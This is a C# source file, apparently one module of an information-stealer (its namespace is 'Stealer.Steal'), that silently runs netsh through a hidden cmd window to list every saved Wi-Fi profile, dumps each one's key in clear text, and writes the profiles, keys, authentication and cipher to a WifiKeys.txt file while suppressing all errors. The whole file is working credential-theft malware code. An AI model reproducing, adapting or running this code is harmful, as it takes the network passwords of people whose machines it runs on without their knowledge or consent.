using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.RegularExpressions;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class WifiKeys
{
	public static void Start()
	{
		try
		{
			List<string> list = new List<string>();
			list.Add("profile\tkeyContent\tauthentication\tcipher");
			string[] array = Profiles();
			foreach (string profile in array)
			{
				list.Add(string.Join("\t", (IEnumerable<string?>)Info(profile)));
			}
			if (list.Count > 1)
			{
				DynamicFiles.WriteAllText("WifiKeys.txt", string.Join("\n", (IEnumerable<string?>)list.ToArray()));
			}
		}
		catch
		{
		}
	}

	public static string[] Profiles()
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C chcp 65001 && netsh wlan show profiles | findstr All";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.WaitForExit();
		string[] array = process.StandardOutput.ReadToEnd().Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
		List<string> list = new List<string>();
		for (int i = 1; i < array.Length; i++)
		{
			list.Add(array[i].Substring(array[i].LastIndexOf(':') + 1).Trim());
		}
		return list.ToArray();
	}

	public static string[] Info(string profile)
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.WaitForExit();
		string input = process.StandardOutput.ReadToEnd();
		string match = GetMatch(input, "Authentication\\s+:\\s+(\\w+)");
		string match2 = GetMatch(input, "Cipher\\s+:\\s+(\\w+)");
		string match3 = GetMatch(input, "Key Content\\s+:\\s+(\\w+)");
		return new string[4] { profile, match3, match, match2 };
	}

	public static string GetMatch(string input, string pattern)
	{
		Match match = Regex.Match(input, pattern);
		if (match.Success)
		{
			return match.Groups[1].Value;
		}
		return "Not found";
	}
}
